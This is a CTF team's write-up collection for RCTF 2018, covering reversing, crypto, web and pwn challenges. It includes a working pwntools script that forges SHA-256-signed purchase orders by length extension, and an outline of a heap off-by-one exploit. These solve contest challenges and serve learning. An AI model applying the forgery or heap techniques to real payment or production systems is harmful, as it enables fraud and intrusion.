---
title: "Rctf 2018 - Write ups"
author: "mHACKeroni team"
comments: true
---


This is the collection of all of our write-ups for rctf2018. Our final result was an incredible 3rd place !!

Index
-------
[Compiler](#compiler) - [Git](#git) - [CPUSHOP](#cpushop) - [ECDH](#ecdh) - [SQL](#sql) - [babyre2](#babyre2) - [Cats](#cats) - [Cats Rev. 2](#cats-rev-2) - [No-js](#no-js) - [babyheap](#babyheap) - [rBlog 2018](#rblog-2018) - [rBlog 2018 v2](#rblog-2018-v2) - [520gift](#520gift) - [Number magic](#number-magic) - [Simulator](#simulator) - [stringer](#stringer) - [Simple vm](#simple-vm) - [Babyre](#babyre) - [Sign](#sign) - [AMP](#amp) - [RNote3](#rnote3) - [Simple re](#simple-re) - [RNote4](#rnote4) - [backdoor](#backdoor) - [r-cursive](#r-cursive)
#### [Comments section](#disqus_thread)


Compiler
--------
[Attachment(original link)](https://mega.nz/#!z7o1kIbB!pIHPh0-3K4N5bM2Ray1zkp76XJe-WvKc3yR1sgdCygM)

We are given an ISO image of a bootable Arch Linux distro.

In "/home" there was a .c file. Being the challenge name "compiler", we compiled and executed it. Besides printing the expected "hello world" message, the binary also creates a backdoor file.

Grepping for "backdoor" we find that libc.a matches.
Further grepping for "rctf" inside its objects files, we notice that libc_start.o matches.

Inside libc_start we see a series of hints and by comparing the function with the original archlinux libc.a, we notice that a number of new basic blocks were added.

We debugged the application to analyze the modified code. There was a loop that was writing in a buffer, so we dumped its contents right after all the computations were performed.
This way we obtained the first part of the flag: "RCTF{Without".

Meanwhile, a hint for compiler was released, saying "try \"flag\" command". By issuing the "flag" command in bash, we see unexpected strings on the terminal.
"flag" was neither an alias, nor a binary in the system, so after some thoughts we decided to check out "bash".
Indeed "bash" was re-compiled statically, so we assumed it had been tampered. In fact we found that a set of new builtin commands were added to bash, namely "prince", "queen", "flag" together with a set of other aliases.

Each of those custom builtins were printing some stuff using the "print_flag_string" function.
This function xor's each character with 0x03, so we scripted a bit to extract all the strings:

        Who has been sitting in my chair?
        Who has been eating from my plate?
        Who has been eating my bread?
        Who has been eating my vegetables?
        Who has been eating with my fork?
        Who has been drinking from my cup?
        Oh good heaven!
        This child is beautiful!
        So Snow White lived happily with the dwarves.
        So Snow White lived happily with the dwarves.
        So Snow White lived happily with the dwarves.
        So Snow White lived happily with the dwarves.
        So Snow White lived happily with the dwarves.
        Good heavens, where am I?
        Oh, my dear, you saved me!
        Look at here, I stole this from the queen's pocket!
        "The hashes of remaining flag is: 13340610174042144018, 95741437967718225, 484886919005526"
        "The flag is [part1, plain(hash1), plain(hash2), plain(hash3), '}').join('')"
        I know the queen hijacked me by a function which used this hash algorithm!
        The evil queen was banished from the land forever and the prince and Snow White lived happily ever after.
        Mirror, mirror, on the wall,
        Who in this land is fairest of all?
        You, my queen, are fair; it is true.
        But Snow White, beyond the mountains
        With the seven dwarves,
        Is still a thousand times fairer than you.
        I'll easily get rid of my apples.  Here, I'll give you one of them.
        Look, I'll cut the apple in two.  You eat half and I shall eat half.
        White as snow, red as blood, black as ebony wood! The dwarves shall never awaken you.
        OK, you're right. But you cannot wake her up unless you know how the Snow White dead.
        Give me the executable name of 'flag':
        Let me have the coffin. I will give you anything you want for it.
        Who can wake the Snow White up? Call him!


We can see that a few strings give some hints regarding the flag:

        The flag is [part1, plain(hash1), plain(hash2), plain(hash3), '}').join('')
        The hashes of remaining flag is: 13340610174042144018, 95741437967718225, 484886919005526
        I know the queen hijacked me by a function which used this hash algorithm!


The last string hints to the hashing algorithm used by bash to manage the builtin aliases. Normally bash uses the "khash" algorithm, but by inspecting the custom "bash" binary, we noticed that the hash function "hash_string" was modified.

We reversed the customized hashing algorithm, and since the hashes were known, we bruteforced all possible combinations of strings using a charset of `[a-zA-Z0-9_]` to get the expected hashes.

We had to bruteforce 8+ characters at a time, so the only feasible solution is a meet in the middle algorithm.  
We cached 4 characters worth of hashes and then bruteforced the rest computing the reverse hash and looking for a match in the hash.  
We didn't find any collision and later the author told us that he modified the standard bash hashing algorithm to avoid collisions.

This way we obtained the final part of the flag. The flag was "RCTF{Without_no_seAms_NoR_nEeDlework}".

```cpp
#include <cstring>
#include <iostream>
#include <map>
using namespace std;
map<unsigned long long, string> m;
unsigned long long mhash(string s)
{
    unsigned long long result = 0;
    unsigned long long p = 139;
    for (auto v : s) {
        result = (p * result) ^ (v);
    }
    return result;
}
unsigned long long rhash(string s, unsigned long long start)
{
    // 139^-1 mod 2^64
    unsigned long long p = 4246732448623781667ull;

    unsigned long long result = start;
    for (auto v : s) {
        result = (p * (result ^ v));
    }
    return result;
}
string rev(string s) {
    string t = "";
    for (auto c : s)
        t = (c) + t;
    return t;
}
// RCTF{With_no_seAms_NoR_nEeDlework}
/*Dlekrow}
*/
char printable[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_";
string w = "0123";
string w1 = "01234";
int main()
{
    cout << "inv " << 4246732448623781667ull * 139ull << endl;
    for (int i = 0; i <= strlen(printable); i++) {
        w[0] = printable[i];
        cout << i << endl;
        for (int j = 0; j <= strlen(printable); j++) {
            w[1] = printable[j];
            for (int k = 0; k <= strlen(printable); k++) {
                w[2] = printable[k];
                for (int l = 0; l <= strlen(printable); l++) {
                    w[3] = printable[l];
                    auto z = mhash(w);
                    if (m.find(z) != m.end()) {
                        cout << "collision " << w << ' ' << m[z] << '\n';
                    }
                    m[z] = w;
                }
            }
        }
    }
    for (int i = 0; i <= strlen(printable); i++) {
        w1[0] = printable[i];
        cout << i << endl;
        for (int j = 0; j <= strlen(printable); j++) {
            // cout << j << endl;
            w1[1] = printable[j];
            for (int k = 0; k <= strlen(printable); k++) {
                w1[2] = printable[k];
                for (int l = 0; l <= strlen(printable); l++) {
                    w1[3] = printable[l];
                    for (int s = 0; s <= strlen(printable); s++) {
                        w1[4] = printable[s];
                        //for (int t = 0; t <= strlen(printable); t++) {
                        //    w1[5] = printable[t];
                            // for (int u = 0; u <= strlen(printable); u++) {
                            //     w1[6] = printable[u];
                                auto z = rhash(w1, 13340610174042144018ull);
                                if (m.find(z) != m.end())
                                    cout << "part 2 " << (m.find(z)->second) << rev(w1) << endl;
                                z = rhash(w1, 95741437967718225ull);
                                if (m.find(z) != m.end())
                                    cout << "part 3 " << (m.find(z)->second) << rev(w1) << endl;
                                z = rhash(w1, 484886919005526ull);
                                if (m.find(z) != m.end())
                                    cout << "part 4 " << (m.find(z)->second) << rev(w1) << endl;
                            // }
                        //}
                    }
                }
            }
        }
    }
}
```



Git
-----------------
[Attachment(original link)](https://drive.google.com/open?id=1Mo3uN2FV1J-lbqjQZvvXitWagZqjD1Xi)

We are given a git repository

Let's explore the logs
```
chqma@computer:~/ctf/rctf/git$ git log
commit 22d3349a5c6fe45758daba276108137382a01caa (HEAD -> master, develop)
Author: zsx <zsx@zsxsoft.com>
Date:   Sun May 13 12:54:34 2018 +0800

    Initial Commit
```

Nothing interesting...

Check .git
```
chqma@computer:~/ctf/rctf/git$ ls -lar
total 16
-rw-r--r-- 1 chqma chqma   11 mag 13 06:54 HelloWorld.txt
drwxr-xr-x 8 chqma chqma 4096 mag 19 08:18 .git
drwxr-xr-x 3 chqma chqma 4096 mag 19 08:18 ..
drwxr-xr-x 3 chqma chqma 4096 mag 13 06:55 .
chqma@computer:~/ctf/rctf/git$ ls .git/
branches        config       HEAD   index  logs     ORIG_HEAD
COMMIT_EDITMSG  description  hooks  info   objects  refs
```

Ok COMMIT_EDITMSG and description look suspicious, let's check them out
```
chqma@computer:~/ctf/rctf/git$ cd .git
chqma@computer:~/ctf/rctf/git/.git$ cat description 
Unnamed repository; edit this file 'description' to name the repository.
chqma@computer:~/ctf/rctf/git/.git$ cat COMMIT_EDITMSG 
Revert
# 请为您的变更输入提交说明。以 '#' 开始的行将被忽略，而一个空的提交
# 说明将会终止提交。
#
# 位于分支 rctf
# 要提交的变更：
# 删除：     flag.txt
#
```

So the flag was commited by "mistake", let's find the commit hash with git reflog
```
chqma@computer:~/ctf/rctf/git/.git$ git reflog
22d3349 (HEAD -> master, develop) HEAD@{0}: checkout: moving from develop to master
22d3349 (HEAD -> master, develop) HEAD@{1}: rebase -i (finish): returning to refs/heads/develop
22d3349 (HEAD -> master, develop) HEAD@{2}: rebase -i (start): checkout 22d3349
f671986 HEAD@{3}: checkout: moving from master to develop
22d3349 (HEAD -> master, develop) HEAD@{4}: checkout: moving from develop to master
f671986 HEAD@{5}: checkout: moving from master to develop
22d3349 (HEAD -> master, develop) HEAD@{6}: checkout: moving from rctf to master
f671986 HEAD@{7}: commit: Revert
f4d0f6d HEAD@{8}: commit: Flag
22d3349 (HEAD -> master, develop) HEAD@{9}: checkout: moving from master to rctf
22d3349 (HEAD -> master, develop) HEAD@{10}: commit (initial): Initial Commit
```

Now just check out the right commit and we are done
```
chqma@computer:~/ctf/rctf/git/.git$ cd ..
chqma@computer:~/ctf/rctf/git$ git checkout f4d0f6d
Note: checking out 'f4d0f6d'.

You are in 'detached HEAD' state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by performing another checkout.

If you want to create a new branch to retain commits you create, you may
do so (now or later) by using -b with the checkout command again. Example:

  git checkout -b <new-branch-name>

HEAD is now at f4d0f6d... Flag
chqma@computer:~/ctf/rctf/git$ ls
flag.txt  HelloWorld.txt
chqma@computer:~/ctf/rctf/git$ cat flag.txt 
RCTF{gIt_BranCh_aNd_l0g}
```



CPUSHOP
---------------

### Overview

We are given a python source code for the app

it generates a signkey

```python
signkey = ''.join([random.choice(string.letters+string.digits) for _ in xrange(random.randint(8,32))])
```

We can choose among many cpus with different price tag or the flag

```python
items = [('Intel Core i9-7900X', 999), ... ,('Flag', 99999)]
```

However we don't have enough money for the flag

```python
money = random.randint(1000, 10000)
```

If we order a product we are given a signed order like this one

`product=Intel Core i9-7900X&price=999&timestamp=1526709982568192&sign=d37055b05664f5563062aa45510ad8d779d8cb2c103bdf2791dfd5ef6c44927d`

In the pay function it checks that the signature of the order is correct

```python
    sp = payment.rfind('&sign=')
    if sp == -1:
        print 'Invalid Order!'
        return
    sign = payment[sp+6:]
    try:
        sign = sign.decode('hex')
    except TypeError:
        print 'Invalid Order!'
        return

    payment = payment[:sp]
    signchk = sha256(signkey+payment).digest()
    print(repr(payment))
    print(signchk.encode('hex'))
    print(len(signkey))
    if signchk != sign:
        print 'Invalid sign!'
        return
```

If we set product to Flag and we have enough money the server will send us the flag

```python
    for k,v in parse_qsl(payment):
        if k == 'product':
            product = v
        elif k == 'price':
            try:
                price = int(v)
            except ValueError:
                print 'Invalid Order!'
                return

    if money < price:
        print 'Go away you poor bastard!'
        return
```

### Signature

The signature algorithm is simple
```python
payment = 'product=%s&price=%d&timestamp=%d' % (items[n][0], items[n][1], time.time()*1000000)
sign = sha256(signkey+payment).hexdigest()
```

It uses sha256 and the secret is at the beginning, so it is vulnerable to a hash extension attack.

There are many tools for hash extension, we chose [https://github.com/iagox86/hash_extender](https://github.com/iagox86/hash_extender) because it is kind of reliable.

### Pay

The pay function doesn't check for:
1. repeated keys 
2. the order of the keys.
3. if the keys are valid

It will always keep the latest value.
```python
for k,v in parse_qsl(payment):
    if k == 'product':
        product = v
    elif k == 'price':
        try:
            price = int(v)
        except ValueError:
            print 'Invalid Order!'
            return
```

### Idea

1. Append &product=Flag to a cheap product
2. Append &price=1 to a Flag order

We choose the first route because it seems more reliable

### Solving

The last challenge is the length of the secret which is randomized at the start.

We just loop through every possible length

```python
import pwn
import subprocess
import random
pwn.context(log_level='DEBUG')
with pwn.remote('cpushop.2018.teamrois.cn', 43000) as r:
# with pwn.process(['python', 'cpushop.py']) as r:
    for i in range(8, 33):
        r.recvuntil('Command')            
        r.sendline('2')
        r.recvuntil('Product ID')
        r.sendline('0')
        r.recvuntil('Your order:\n')
        s = r.recvline()

        ### get order and signature
        d, s = s.strip().split('&sign')

        ### get hash extended string
        l = subprocess.check_output([
            '/home/chqma/ctf/hash_extender/hash_extender', '-d', d, '-s', s, '-a', '&product=Flag', '-f', 'sha256', '-l', str(i), '--out-data-format', 'raw'
        ])
        print(l)
        head = 'New signature: '
        s = l[l.find(head) + len(head):l.find('\n', l.find(head))]
        d = l[l.find('New string: ') + len('New string: '):l.find('\n', l.find('New string: '))]
        r.recvuntil('Command')        
        r.sendline('3')
        
        r.sendline('{}&sign={}'.format(d, s))
        
    ### profit
    r.interactive()
```



ECDH
-------

### Overview
A crypto challenge

ECDH -> elliptic curve diffie hellman [ECDH](https://en.wikipedia.org/wiki/Elliptic-curve_Diffie%E2%80%93Hellman)

We can iteract with Alice and Bob

Choosing `about` will tell us the curve parameters and the symmetric key algorithm that will use the shared secret from the exchange
```
chqma@computer:~$ nc ECDH.2018.teamrois.cn 42000

Welcome to my GETFLAG system
1. visit Alice
2. visit Bob
3. about
input here: 3
ECDH.....https://github.com/esxgx/easy-ecc..secp128r1..AES...EBC.......
```

We can ask Alice for the public keys, but also set Bob's public key

```
Hello nobody...I'm Alice... you can:
1. ask for flag
2. ask me about my public key
3. ask me about Bob's public key
4. tell me Bob's public key
```

We can do the same with Bob

```
Hello nobody...I'm Bob... you can:
1. ask for flag
2. ask me about my public key
3. ask me about Alice's public key
4. tell me Alice's public key
```

If we ask Bob for the flag he will use ECDH to share an AES key with Alice and then send an encrypted flag to Alice

### Protocol

In ECDH the shared secret `x` is the x coordinate of the point `dA*dB*G` where `dA` and `dB` are numbers (the private secret of Alice and Bob) and `G` is a fixed generator point of the curve.

It is computed combining Alice's private key with Bob public key and vice versa.

Bob and Alice public keys are `dB*G` and `dA*G`.

Since Bob is encrypting the message, his computed secret will be `dB * PublicAlice`, that is `dB * dA * G` if we don't change Alice's public key.

#### Main idea

We notice that if we set Alice's public key to something we know like `2 * G`, Bob's shared key will be `db * 2 * G`, that is `PublicBob * 2`.

The shared key will depend only on public data.

We congecture that
- aes128 is used since the curve is 128bit
- there is no key derivation function

### Solution

0. Get curve parameters
1. Get Bob public key
2. Set Alice public key to `2*G`
3. Ask Bob for flag (msg)
4. Get encrypted flag from Alice
5. Fire up SageMath

```python
from Crypto.Cipher import AES
# setup
F = GF(0xFFFFFFFDFFFFFFFFFFFFFFFFFFFFFFFF)
p = 0xFFFFFFFDFFFFFFFFFFFFFFFFFFFFFFFF
a = 0xFFFFFFFDFFFFFFFFFFFFFFFFFFFFFFFC
b = 0xE87579C11079F43DD824993C2CEE5ED3
G = (0x161FF7528B899B2D0C28607CA52C5B86,
     0xCF5AC8395BAFEB13C02DA292DDED7A83)
n = 0xFFFFFFFE0000000075A30D1B9038A115
h = 1
s128r1 = EllipticCurve(F, (a, b))
G = s128r1(G)

# copied from terminal
bx = 0x2d5381d8a0fdf4ca9afa662726aed8b2
g2 = '038151a0c6b92171db199db84be753a97e'
msg = 'aa19f4de6c487c333855a2fab0e95a8a44f143760283eabdf985bde4fad89067'
ss = uncompress(bx, 1) * 2
ak = '{:016x}'.format(int(ss[0]))
print(len(ak))
print(len(msg.decode('hex')))
cp = AES.new(ak.decode('hex'), mode=AES.MODE_ECB,)

cp.decrypt(msg.decode('hex'))
# 'RCTF{UgotTHEpoint}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
```




```python
### Helper functions

def uncompress(px, s):
    f = x**3 +a*x + b
    y = int(pow(int(f(x=px)), int((p+1)/4), p))
    if s == 1:
        return s128r1((px, p-y))
    else:
        return s128r1((px, y))
```



SQL
---------------

### Overview

Novel reverse challenge

We are given log file

```
SQLite version 3.8.2 2013-12-06 14:53:30
Enter ".help" for instructions
Enter SQL statements terminated with a ";"
sqlite> explain [redacted]
0|Trace|0|0|0||00|
1|Goto|0|93|0||00|
        ...
```

*explain* is an sqlite statement which tells the dbms to output the underlying vm commands for a given query

I found a couple of interesting articles about *explain* and *SQLite’s “Virtual DataBase Engine”*
1. https://medium.com/@JasonWyatt/squeezing-performance-from-sqlite-explaining-the-virtual-machine-2550ef6c5db
2. https://stackoverflow.com/questions/17663379/how-to-understand-sqlite-explain-query-plan-result
3. https://github.com/endlesssoftware/sqlite3/blob/master/vdbe.c

The most important is the official vdbe opcode documentation https://www.sqlite.org/opcode.html

### Solution

We just have to implement a basic vdbe interpreter

We made some educated guesses to simplify our work
1. only implemented Goto,OpenRead,String8,Integer,Function (limited to substr),Ne and Halt
2. the first part of the code sets up a lookup table
3. the second part picks a character of the flag at a time and compares it with the right value

#### Important pattern
Select XXXX-th character to compare with character in register BBBB, jump to HALT if not equal
```
98|String8|0|BBBB|0|f|00|
139|Integer|XXXX|AAAA+1|0||00|
140|Integer|1|AAAA+2|0||00|
52|Column|0|0|AAAA||00|
53|Function|6|AAAA|1|substr(3)|03|
54|Ne|BBBB|90|1||6a|
```

#### Solver code

```python
from logging import log
import logging
logi = lambda msg: log(logging.INFO, msg) 
logw = lambda msg: log(logging.WARNING, msg) 
loge = lambda msg: log(logging.ERROR, msg) 
class SQLvm:
    def __init__(self, mem):
        self.regs = {}
        self.flag = [''] * 200
        self.regs['pc'] = 0
        self.mem = mem
    def step(self):
        code = self.mem[self.regs['pc']]
        self.regs['pc'] += 1
        if code[0] == 'Goto':
            self.regs['pc'] = int(code[2])
        elif code[0] == 'OpenRead':
            logw('OpenRead')
            self.cursor = []
        elif code[0] == 'String8':
            self.regs[int(code[2])] = code[4]
            logw('{} = {}'.format(code[2], code[4]))
        elif code[0] == 'Integer':
            self.regs[int(code[2])] = int(code[1])
        elif code[0] == 'Column':
            logw(code)
            self.flag[int(code[3])] = ''
            self.regs[int(code[3])] = int(code[3])
        elif code[0] == 'Function':
            # s = self.regs[int(code[2])]
            # x = self.regs[int(code[2]) + 1]
            # y = self.regs[int(code[2]) + 2]
            self.regs[int(code[3])] = self.regs[int(code[2]) + 1]
            pass
        elif code[0] == 'Ne':
            logw(code)
            logw(''.join(self.flag))
            self.flag[self.regs[int(code[3])]] = self.regs[int(code[1])]
            self.regs[int(code[3])] = self.regs[int(code[1])]
            if self.regs[int(code[3])] != self.regs[int(code[1])]:
                self.regs['pc'] = int(code[1])
        elif code[0] == 'Halt':
            logw('Halted')
            return True
        else:
            loge(code)
# put the log file there
code = '''0|Trace|0|0|0||00|
1|Goto|0|93|0||00|

....

165|Goto|0|2|0||00|'''
compcode = []

for line in code.splitlines():
    compcode.append(line.split('|')[1:])

vm = SQLvm(compcode)
# step until halt
while not vm.step():
    pass
for k in vm.regs:
    if type(vm.regs[k]) == type(''):
        print(k, vm.regs[k])

print(''.join(vm.flag))
'flag{lqs_rof_galf_esreve_a}'
```

### Note

Since we made some approximations or mistakes, the output is not correct, but it is easy to guess the right flag
`flag{lqs_rof_galf_esrever_a}`



babyre2
------------------
[Attachment](https://drive.google.com/open?id=1QAnMBvmftbM51fHkfsbO1xixSC26XKmS)
### Overview

Reverse challenge

We are given a binary with xmm instructions

It takes a string as input and then multiplies it with some constants on the stack takes the remainder mod 0xFFFFFFFFFFFFFFC5 (which is prime) and saves the results on the stack

function at 0x400BA0 takes three arguments (flag[i] * multipl[i], modulus, 0)
- when the third argument is 0 is computes (flag[i] * multipl[i]) % modulus

from 0x40098F on in the main it xors the results with some global variable and checks if the every xor is 0

if we pass the check it prints "Correct. Congratulations!"

### Solution

Since every step is invertible we just reverse the algorithm and get the flag with the formula:

```
flag[i] = ((int64*) xmm)[i] * multipl[i]^-1
```

Now copy the constants from the binary and we are done

### Script (sagemath)


```python
import binascii
from Crypto.Util.number import long_to_bytes
from Crypto.Util.strxor import strxor

for _ in xrange(8):
    pieces.append(0xffffffffffffffff)
multipl = [0] * 16
multipl[0] = 2334392307038315863L;
multipl[1] = 2325638905700839284L;
multipl[2] = 7298118523202646066L;
multipl[3] = 2333181762011686258L;
multipl[4] = 7142785229535732034L;
multipl[5] = 7306930302321713512L;
multipl[6] = 8462115405118268960L;
multipl[7] = 0xffffffffffff002e;
multipl[8] = 2^64 - 1;
multipl[9] = 2^64 - 1;
multipl[10] = 2^64 - 1;
multipl[11] = 2^64 - 1;
multipl[12] = 2^64 - 1;
multipl[13] = 2^64 - 1;
multipl[14] = 2^64 - 1;
multipl[15] = 2^64 - 1;
# multipl[7] = 46;
length = len(multipl)
mod_value = 0xffffffffffffffc5
xmm_values = []

xmm_values.extend([0x7BA58F82BD898035,0x2B7192452905E8FB][::-1])
xmm_values.extend([0x163F756FCC221AB0,0xA3112746582E1434][::-1])
xmm_values.extend([0xDCDD8B49EA5D7E14,0xECC78E6FB9CBA1FE][::-1])
xmm_values.extend([0xAAAAAAAAAA975D1C,0xA2845FE0B3096F8E][::-1])
xmm_values.extend([0x55555555555559A3,0x55555555555559A3][::-1])
xmm_values.extend([0x55555555555559A3,0x55555555555559A3][::-1])
xmm_values.extend([0x55555555555559A3,0x55555555555559A3][::-1])
xmm_values.extend([0x55555555555559A3,0x55555555555559A3][::-1])
flag = [0] * length
for i in xrange(length):
    flag[i] = long_to_bytes(int(int((xmm_values[i]) * int(pow(multipl[i], - 1, mod_value))) % mod_value))[::-1]
print(''.join(flag))
```

    flag{stay_prime_stay_invertible_away_from_bruteforce}UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU




Cats
--------------------

### Overview

We have a webform that let's us submit a list of cat food and a list of cat names.

It saves the cat food list to a file named `food` and then for each cat name, it runs the command

```docker run -it --rm --network none -v /tmp/yourCatFood:/app/food:ro rctf_cats bash -c "timeout 5 diff -Z <(cat food) <(eachCatNameYouProvided food)```

We can download the dockerfile of the challenge environment, so we build the container and look for what commands we can use.

We list the binaries for each location in the $PATH variable
```bash
echo $PATH
-> /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

and we get this list https://pastebin.com/WRkbFmmw

### Solution

We noticed that there are a lot of sh-like commands (many are just symlinks):

`sh,dash,rbash,bash`

If we put `cat food` as food we will get 4 cat names at the cost of 1.

Then we looked for other cat-like programs, since choosing `cat food` as food limits our possibilities to use other interpreters.

We found at first `tail,head,sort,tac,uniq` which are identical to cat in this case

Then we found some exotic commands like `zmore,more,splain,expand,unexpand,fold`

So in the end we submitted
`cat food`

`sh,dash,rbash,bash,zmore,more,splain,expand,unexpand,fold,tail,head,sort,tac,uniq`

And got
```
Wew, you've found 15 cats! Here is your flag: RCTF{you_love_cats_dont_you}. If you can find at least 4 out of 5 cats whose names in (python3, bash, php, node, ruby), I will give you another flag ._.
```

Time for another challenge ._.

### Notes

You'll spend a lot of time fighting re-captcha


Cats Rev. 2
--------------------

### Overview

```If you can find at least 4 out of 5 cats whose names in (python3, bash, php, node, ruby), I will give you another flag ._.```

Same as Cats, but this time we need to make the file an executable polyglot to make it work with those commands.

Our objective is to make the file read itself.

### Solution

We need to choose 4 of the 5 commands to work with. PHP is easy, since if the file does not contain any PHP code the command will just print out the contents of the file. One done.

Let's work with Python. A useful feature in Python is the multiline comment: using three single quotes lets us comment many lines of code in Python, while at the same time leaves these lines valid for other languages. For example in Ruby and Bash four quotes are equivalent to two concatenated empty strings and are perfectly valid. 

We can make some space for ruby and bash code in the comment, while calling the system function to make Python read the file itself.

```
a = ''''
# bash and ruby code here
' '''
import os; os.system('cat food')
```

We now want to write some code that is valid for both Bash and Ruby. 

The '!' operator in Bash evaluates a command and inverts the exit code, while in Ruby it's a normal "is false" operator. We can use this to make an if to distinguish the two cases, then make the script exit immediately after reading the file to avoid syntax errors.

Final version:

```
a=''''
test=true
if ! test ;
then
        cat food; exit 0
fi
end
exec('cat food')
' '''
import os; os.system('cat food')
```

Working cats:

```
tail,head,dash,sh,zmore,more,splain,uniq,expand,rbash,fold,python3,ruby,php,bash
```



No-js
--------------------

### Overview

We're greeted with a password prompt. Our objective is to find the correct password.

The page is written in React, let's look at the source code and try to understand how the password is checked.

The source code is sadly minified, all functions and variables are one or two letter long. This made reversing the code quite harder.

We anyhow understand that the password is like ```RCTF{XXX_XXX_XXX_XXX_XXX_XXX_XXX}```.
The password is split over the underscores, then the 7 individual pieces are checked separatedly with different expressions.

For reference, we're talking about the section of code that starts like

```
   var sg = new Y(null, 7, 5, Z, [function (a) {
        return K.f(a, "no")
    }, function (a) {
        return K.f(0, Kd(new Y(null, 10, 5, Z, [45, 36, 57, 36, 54, 38, 53, 1, 51, 55], null), li(a)))
    }, function (a) {
        return K.f(mi(a), "0SWCRMLH")
    }, function (a) {
        return K.f(mi(a), "000EQTPI")
    }, Bk, function (a) {
    [...]
```

Let's walk over them one by one.

#### Word 1
The function ```K.f``` is just an equality check. 
The first word is therefore ```no```.

#### Word 2
```Y``` is just a wrapper for the object passed as fifth argument.
The check basically forces ```li(word)``` to be equal to [45, 36, 57, 36, 54, 38, 53, 1, 51, 55].
Looking at the function ```li``` we can see that it works char by char, and is thus easily bruteforced and inverted.

The second word is ```javascr1pt```.

#### Words 3 and 4
The third and fourth checks both use the function ```mi```.

There's a lot of boilerplate, but after some reversing we can see that:
- The function ```mi``` takes a string and splits it in blocks of 5 chars.
- For each block a 8-chars long string is built.
- The new string is made by computing combinations of bits of the 5 input byes and using those as index on  "765432ABCDEFGHIJKLMNOPQRSTUVWXYZ".
- The string is finally padded with '0's.

This function is also easily invertible.
We find the original bytes for "0SWCRMLH" and "000EQTPI" and we get two new words, ```lets``` and ```use```.

#### Word 5
The fifth check is a call to the function ```Bk```.
```Bk``` makes an eval on a string, which we find out is equivalent to an equality between two BigInts, one fixed and one derived from our input.
The latter is returned from ```Ak(a)```.

```Ak``` contains lots of complex operations, but by looking up on google some of the numbers used, we find out they are md5 constants. ```Ak``` is most probably an md5 digest.

The check passes if ```Bk``` returns 270350715534787783724753109733385149467, which in hex is 0xcb63a762f1571806222efef7ec7f9c1b, i.e. the md5 hash of '50me'. We test it and the check passes.

The fifth word is ```50me```.

#### Word 6
This check is a maze of callbacks and was awful to reverse.

To begin we can see that the value returned by calling an inline function on our input must be equal to [21104, 50328, 78128, 119488, 411168, 592832].

Since the function is a little too complex we decided to do some black-box analysis.
With some tests we can see that the array which is returned contains a number for every 2 chars contained in the input.
Even better, every 2 chars correspond to a single value, that is then multiplied by 2^(index) in the array itself.

Since the check is computed 2 chars at a time, this is again bruteforceable.
The sixth word is ```funcccTional```.

#### Word 7
This check is another maze of callbacks, so we decided to make some top-level assumptions to simplify the analysis.
- There're a lot of "type conversions", that don't change the inner value of a variable, we consider them js primitives to determine the logic
- There's an abuse of the `Re` function, we assume all parameters except the first one are arrays of ints (verified with Chrome Dev Tools in some cases)

Using a top-down approach:
- `K.f` checks that the output of `window.btoa` is equals to a given base64 encoded string
- `fi(a, b)` turns out to be `b.join(a)`
- The next couple of `Re()` convert an array of int into an array of chars
- The next 3 callbacks are ensuring we are passing one char at a time, and doing some weird type conversions that we ignored. The only important part is knowing that our input is passed through `li()`.
- Once we arrive at `function (a, c, d, e) {`, we see a static argument calculated as: `xe(hd, xe(hd, be(22, 33), li("okotta")), new Y(null, 3, 5, Z, [11, 45, 14], null))`. We evaluated it using Chrome Dev Tools, it looks like a linked-list of the following numbers: `14 45 11 36 55 55 50 46 50 22 33`
- We move inside `function (a, c) {`, ignoring all the other wrappers/type convertions
- `if (Cd(a)) {` is always false, ignore body
- `g = N(a);` fetchs the first element of `a` (input array)
- `ed(c + g, w(Hc(a)))` calculated the sum of `c + g`, `Hc(a)` removes the first element of `a`

At a top level, the scripts does:
- Split the input in an array of int (using chartCode)
- Passing the array through `li()`
- Doing a sum of every element of the array, with every element of our static linked-list (`14 45 11 36 55 55 50 46 50 22 33`)
- Concatenating the results into a string
- Base64 encoding the string
- Matching the string with the given one

At this point, we can reverse the algorithm with a quick python script:
```
##!/usr/bin/env python2
import base64

target = [ord(x) for x in base64.b64decode("PVw6U2ZmYV1hRVAyUS9IW1tWUlY6RTJRL0hbW1ZSVjpFMlEvSFtbVlJWOkUyUS9IW1tWUlY6RT9ePFVoaGNfY0dSP148VWhoY19jR1IePRs0R0dCPkImMUZlQ1xvb2pmak5ZMlEvSFtbVlJWOkU4VzVOYWFcWFxASzZVM0xfX1pWWj5JNlUzTF9fWlZaPkk2VTNMX19aVlo+STZVM0xfX1pWWj5JDy4MJTg4My8zFyI=")]
sub = [14, 45, 11, 36, 55, 55, 50, 46, 50, 22, 33]

reversePartOne = []
i = 0
while i < len(target):
    reversePartOne.append(target[i] - sub[0])
    i = i+11

def li(a):
    if 57 >= a:
        return a - 48
    else:
        if 90 >= a:
            return a - 65 + 10
        else:
            if 122 >= a:
                return a - 97 + 36
            else: return None

inv = {}
for a in range(0, 256):
    inv[li(a)] = a

print ''.join(chr(inv[x]) for x in reversePartOne)
```

The last word is: ```laaaannGuageeee1```

### Solution
Final solution: ````RCTF{no_javascr1pt_lets_use_50me_funcccTional_laaaannGuageeee1}````


babyheap
--------

### Overview

We're given a 64-bit Linux ELF and its libc (2.23). Checksec shows full RELRO, canaries, NX and PIE.

During initialization, a randomly-sized chunk is allocated on the heap to shift the user allocations by a random offset. Then, the program shows a basic menu:
```
1. Alloc
2. Show
3. Delete
4. Exit
```

We can allocate up to 32 heap chunks with size up to 256. They are `calloc`ed and then populated with user input. The show option prints the content (as a string), and the delete option frees the chunk.

### Vulnerability

There is an off-by-one vulnerability in the function at 0xBC8, which reads user input. If the user input has the exact same size as the destination buffer, a NUL terminator will overflow the buffer.

### Exploitation

Exploitation is straightforward. We abused the NUL byte overflow via a [free chunk shrinking attack](https://heap-exploitation.dhavalkapil.com/attacks/shrinking_free_chunks.html). Specifically, we get overlaps for two chunks:
- An allocated smallchunk, for leaking libc;
- A freed 0x70 fastchunk, for a fastbin attack.

